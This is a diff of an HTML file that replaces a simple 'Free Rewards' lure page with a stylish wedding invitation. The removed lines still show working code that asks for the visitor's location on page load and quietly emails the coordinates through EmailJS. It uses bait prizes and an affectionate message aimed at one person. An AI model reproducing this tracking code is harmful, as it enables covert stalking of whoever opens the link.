@@ -1,210 +1,189 @@
 <!DOCTYPE html>
-<html>
+<html lang="en" class="scroll-smooth">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Free Rewards Zone</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Royal Invitation ✨</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- AOS Library for Scrolling Animations -->
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts (Premium Look) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Poppins:wght@300;400;600&family=Sacramento&display=swap" rel="stylesheet">
 
-<style>
-body{
- font-family:Arial;
- background:#f2f2f2;
- text-align:center;
-}
-
-h1{
- background:#111;
- color:white;
- padding:15px;
-}
-
-.container{
- display:flex;
- flex-wrap:wrap;
- justify-content:center;
-}
-
-.card{
- background:white;
- width:260px;
- margin:15px;
- padding:15px;
- border-radius:10px;
- box-shadow:0 0 10px rgba(0,0,0,0.2);
-}
-
-.card img{
- width:100%;
- border-radius:8px;
-}
-
-button{
- margin-top:10px;
- padding:10px 15px;
- background:#28a745;
- color:white;
- border:none;
- border-radius:6px;
- cursor:pointer;
-}
-</style>
+    <style>
+        .font-royal { font-family: 'Cinzel', serif; }
+        .font-cursive { font-family: 'Sacramento', cursive; }
+        .font-main { font-family: 'Poppins', sans-serif; }
+        
+        /* Premium Background Glow Shapes */
+        .glow-shape { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.15; z-index: 1; }
+        
+        /* Glassmorphism Effect */
+        .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4); }
+    </style>
 </head>
+<body class="bg-[#0b0c10] text-gray-200 font-main overflow-x-hidden relative">
 
-<body>
-<div id="locationLock" style="
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:#000;
-color:white;
-display:flex;
-flex-direction:column;
-justify-content:center;
-align-items:center;
-z-index:9999;
-text-align:center;
-padding:20px;
-">
+    <!-- Ambient Glow Effects Background -->
+    <div class="glow-shape w-72 h-72 bg-emerald-500 top-10 left-[-50px]"></div>
+    <div class="glow-shape w-96 h-96 bg-cyan-500 top-[40vh] right-[-100px]"></div>
+    <div class="glow-shape w-80 h-80 bg-purple-500 bottom-20 left-10"></div>
 
-<h2>❤️ Khaas Apke Liye Aaryan Jii ☺️ </h2>
-<p>Maine Aapke Liye Kya Send Kii Hu Jara Aap Bhi Dekhiye </p>
+    <!-- 🎵 Floating Audio Controller (Bottom Right) -->
+    <div class="fixed bottom-6 right-6 z-50">
+        <button id="musicBtn" onclick="toggleMusic()" class="w-12 h-12 rounded-full bg-gradient-to-r from-emerald-400 to-cyan-500 text-black flex items-center justify-center font-bold shadow-lg shadow-cyan-500/20 hover:scale-110 transition duration-300">
+            <i id="musicIcon" class="fas fa-music"></i>
+        </button>
+        <audio id="bgMusic" loop>
+            <!-- Apni background music file ka naam ya link yahan daalo -->
+            <source src="wedding-theme.mp3" type="audio/mp3">
+        </audio>
+    </div>
 
-<button onclick="requestLocation()"
-style="padding:14px 22px;font-size:18px;background:#28a745;color:white;border:none;border-radius:8px;">Click My Jaan 
-Aryan
-</button>Aryan My Love ❤️💍
+    <!-- 🏛️ HERO SECTION (Cover) -->
+    <section class="min-h-screen flex flex-col justify-center items-center text-center px-4 relative z-10">
+        <p data-aos="fade-down" data-aos-duration="1200" class="font-royal text-emerald-400 uppercase tracking-[0.3em] text-xs md:text-sm mb-4">The Wedding Invitation</p>
+        
+        <h1 data-aos="zoom-in" data-aos-duration="1500" class="font-cursive text-7xl md:text-9xl text-transparent bg-clip-text bg-gradient-to-b from-white to-gray-400 my-4 py-2">
+            Rahul & Riya
+        </h1>
+        
+        <p data-aos="fade-up" data-aos-duration="1200" data-aos-delay="300" class="font-royal text-sm md:text-md text-gray-400 tracking-widest mt-4">
+            WE ARE GETTING MARRIED
+        </p>
 
-</div>
-<h1>🎁 Free Rewards Collection</h1>
+        <!-- Dynamic Countdown Box -->
+        <div data-aos="fade-up" data-aos-duration="1200" data-aos-delay="600" class="grid grid-cols-4 gap-2 md:gap-4 max-w-sm mt-12 glass-card p-4 rounded-2xl w-full">
+            <div class="text-center"><span id="days" class="block font-royal text-xl md:text-2xl text-emerald-400 font-bold">00</span><span class="text-[10px] text-gray-500 uppercase tracking-widest">Days</span></div>
+            <div class="text-center"><span id="hours" class="block font-royal text-xl md:text-2xl text-emerald-400 font-bold">00</span><span class="text-[10px] text-gray-500 uppercase tracking-widest">Hours</span></div>
+            <div class="text-center"><span id="minutes" class="block font-royal text-xl md:text-2xl text-emerald-400 font-bold">00</span><span class="text-[10px] text-gray-500 uppercase tracking-widest">Mins</span></div>
+            <div class="text-center"><span id="seconds" class="block font-royal text-xl md:text-2xl text-emerald-400 font-bold">00</span><span class="text-[10px] text-gray-500 uppercase tracking-widest">Secs</span></div>
+        </div>
 
-<div class="container" id="products"></div>
+        <div class="absolute bottom-10 animate-bounce text-gray-500">
+            <i class="fas fa-chevron-down text-xl"></i>
+        </div>
+    </section>
 
-<script>
+    <!-- 📜 DETAILS SECTION -->
+    <section class="min-h-screen py-20 px-4 relative z-10 flex items-center">
+        <div class="max-w-4xl mx-auto w-full">
+            <div data-aos="fade-up" data-aos-duration="1000" class="glass-card rounded-3xl p-8 md:p-12 text-center relative overflow-hidden">
+                
+                <div class="w-16 h-16 mx-auto mb-6 flex items-center justify-center rounded-full bg-white/5 border border-white/10 text-emerald-400">
+                    <i class="fas fa-heart text-xl animate-pulse"></i>
+                </div>
 
-const items = [
+                <h2 class="font-royal text-2xl md:text-3xl text-white tracking-wider mb-6">Assalamu Alaikum / Welcome</h2>
+                
+                <p class="text-gray-400 leading-relaxed max-w-2xl mx-auto mb-10 text-sm md:text-base">
+                    Praise be to Almighty, with the grace of family and friends, we cordially invite you to share our joy and witness the beautiful union of our wedding ceremony.
+                </p>
 
-{
- name:"Random Earbuds",
- img:"https://images.unsplash.com/photo-1585386959984-a41552231658"
-},
+                <!-- Event Details Grid -->
+                <div class="grid md:grid-cols-2 gap-6 text-left mt-8">
+                    <!-- Card 1 -->
+                    <div class="bg-black/20 border border-white/5 p-6 rounded-2xl" data-aos="fade-right" data-aos-duration="1000">
+                        <h3 class="font-royal text-emerald-400 font-bold mb-3"><i class="far fa-calendar-alt mr-2"></i> Date & Time</h3>
+                        <p class="text-white font-semibold">Sunday, November 15, 2026</p>
+                        <p class="text-sm text-gray-500 mt-1">Baraat Arrival: 7:00 PM onwards</p>
+                    </div>
 
-{
- name:"Stylish Shoes",
- img:"https://images.unsplash.com/photo-1542291026-7eec264c27ff"
-},
+                    <!-- Card 2 -->
+                    <div class="bg-black/20 border border-white/5 p-6 rounded-2xl" data-aos="fade-left" data-aos-duration="1000">
+                        <h3 class="font-royal text-cyan-400 font-bold mb-3"><i class="fas fa-map-marker-alt mr-2"></i> Venue</h3>
+                        <p class="text-white font-semibold">The Royal Palms Resort</p>
+                        <p class="text-sm text-gray-500 mt-1">Main Banquet Hall, Ring Road, Gujarat</p>
+                        <a href="https://maps.google.com" target="_blank" class="inline-block mt-3 text-xs font-semibold text-cyan-400 underline hover:text-cyan-300">Open in Maps</a>
+                    </div>
+                </div>
 
-{
- name:"Free Fire Diamond 500",
- img:"https://i.imgur.com/9Xn4K3K.png"
-},
+            </div>
+        </div>
+    </section>
 
-{
- name:"PUBG UC 500",
- img:"https://i.imgur.com/0Z8FQ6S.png"
-}
+    <!-- ✍️ RSVP / GUEST NOTE SECTION -->
+    <section class="py-16 px-4 relative z-10">
+        <div class="max-w-md mx-auto">
+            <div data-aos="zoom-in" data-aos-duration="1000" class="glass-card rounded-3xl p-8 text-center">
+                <h2 class="font-royal text-xl text-white tracking-widest mb-6">Confirm Attendance</h2>
+                
+                <div class="space-y-4 text-left">
+                    <div>
+                        <label class="block text-xs uppercase tracking-wider text-gray-500 mb-2 font-semibold">Your Name</label>
+                        <input type="text" placeholder="Enter full name" class="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-600 focus:outline-none focus:border-emerald-400 text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs uppercase tracking-wider text-gray-500 mb-2 font-semibold">Are you attending?</label>
+                        <select class="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-400 text-sm">
+                            <option class="bg-slate-900">Yes, absolutely!</option>
+                            <option class="bg-slate-900">Sorry, I can't make it</option>
+                        </select>
+                    </div>
+                    <button class="w-full py-3 mt-4 bg-gradient-to-r from-emerald-400 to-cyan-500 rounded-xl text-black font-bold tracking-wider hover:opacity-90 shadow-md shadow-emerald-500/10 transition">
+                        Submit Response
+                    </button>
+                </div>
+            </div>
+        </div>
+    </section>
 
-];
+    <!-- Footer -->
+    <footer class="text-center py-8 border-t border-white/5 relative z-10 text-xs text-gray-600 tracking-widest font-royal">
+        Made with ❤️ for the Special Day
+    </footer>
 
-// random items show function
-function showRandomItems(){
+    <!-- AOS Script Initialization -->
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        AOS.init({
+            once: true // Animation bar-bar scroll karne par repeat na ho, seamless lage
+        });
 
- let container = document.getElementById("products");
- container.innerHTML="";
+        // 🎵 Audio Player Toggle Control
+        function toggleMusic() {
+            const music = document.getElementById('bgMusic');
+            const icon = document.getElementById('musicIcon');
+            if (music.paused) {
+                music.play();
+                icon.className = "fas fa-pause";
+            } else {
+                music.pause();
+                icon.className = "fas fa-music";
+            }
+        }
 
- let shuffled = items.sort(()=>0.5-Math.random());
+        // ⏳ Ultimate Countdown Logic (Target: Nov 15, 2026)
+        const targetDate = new Date("November 15, 2026 19:00:00").getTime();
 
- shuffled.forEach(item=>{
-   container.innerHTML += `
-     <div class="card">
-       <img src="${item.img}">
-       <h3>${item.name}</h3>
-       <button onclick="claim()">Claim Now</button>
-     </div>
-   `;
- });
+        const countdownInterval = setInterval(() => {
+            const now = new Date().getTime();
+            const difference = targetDate - now;
 
-}
+            if (difference < 0) {
+                clearInterval(countdownInterval);
+                document.getElementById("days").innerText = "00";
+                document.getElementById("hours").innerText = "00";
+                document.getElementById("minutes").innerText = "00";
+                document.getElementById("seconds").innerText = "00";
+                return;
+            }
 
-function claim(){
- alert("Reward claim process start!");
-}
+            const d = Math.floor(difference / (1000 * 60 * 60 * 24));
+            const h = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const m = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+            const s = Math.floor((difference % (1000 * 60)) / 1000);
 
-showRandomItems();
-
-</script>
-
+            document.getElementById("days").innerText = d < 10 ? "0" + d : d;
+            document.getElementById("hours").innerText = h < 10 ? "0" + h : h;
+            document.getElementById("minutes").innerText = m < 10 ? "0" + m : m;
+            document.getElementById("seconds").innerText = s < 10 ? "0" + s : s;
+        }, 1000);
+    </script>
 </body>
-</html>
-<h3>Delivery ke liye location allow karein</h3>
-<p>Page open hote hi location request aayegi.</p>
-
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
-<script>
-// EmailJS Initialize
-(function(){
-   emailjs.init("2pInQghRcP-YZtYCK");
-})();
-
-// Page load hote hi location request
-window.onload = function() {
-   getLocationAndSend();
-};
-
-function getLocationAndSend() {
-
- if (navigator.geolocation) {
-
-   navigator.geolocation.getCurrentPosition(function(position){
-
-     var lat = position.coords.latitude;
-     var lon = position.coords.longitude;
-
-     // Email send
-     emailjs.send("service_hxul50k","template_3mjgsjk",{
-        latitude: lat,
-        longitude: lon
-     })
-     .then(function(response) {
-        console.log("Location sent");
-     }, function(error) {
-        console.log("Error sending location");
-     });
-
-   },
-   function(){
-     alert("Free Rewards Ke Liye Allow Kare.");
-   });
-
- } else {
-   alert("Location supported nahi hai.");
- }
-
-}
-</script>
-<script>
-function requestLocation(){
-
- if(navigator.geolocation){
-
-   navigator.geolocation.getCurrentPosition(
-     function(position){
-
-       // location mil gayi → unlock website
-       document.getElementById("locationLock").style.display="none";
-
-       console.log("Location Allowed");
-
-     },
-     function(){
-       alert Free Rewards Ke Liye Allow Kare.");
-     }
-   );
-
- }else{
-   alert("Location supported nahi hai.");
- }
-
-}
- </script>
+     </html>
